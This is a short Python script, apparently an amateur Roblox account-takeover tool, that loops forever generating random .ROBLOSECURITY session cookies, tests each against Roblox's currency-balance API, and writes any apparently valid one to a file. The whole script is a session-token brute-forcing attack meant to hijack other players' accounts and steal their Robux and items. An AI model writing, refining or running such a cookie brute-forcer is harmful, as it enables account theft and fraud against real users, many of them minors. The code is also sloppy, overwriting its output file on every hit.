import random
import math
import requests
import json
import robloxapi
import sys
import concurrent

alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

def yoinker():
    while True:
        randomInt = random.randint(0, 1)
        if randomInt == 1:
            letterAmount = 648
        if randomInt == 0:
            letterAmount = 680

        randomLetters = ""
    
        i = 0
        while i < letterAmount:
            if math.floor(random.randint(0, 1)) == 1:
                randomLetters = randomLetters + alphabet[random.randint(0, 25)]
            else:
                randomLetters = randomLetters + str(random.randint(0, 9))
            i = i + 1

        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + randomLetters

        session = requests.Session()
        try:
            session.cookies[".ROBLOSECURITY"] = cookie
            robux = session.get("https://api.roblox.com/currency/balance").json()["robux"]
            with open("cookies.txt","w") as f:
                f.write(cookie + "\n")
            session.close()
        except:
            print("")
        session.close()
        print(cookie)
yoinker()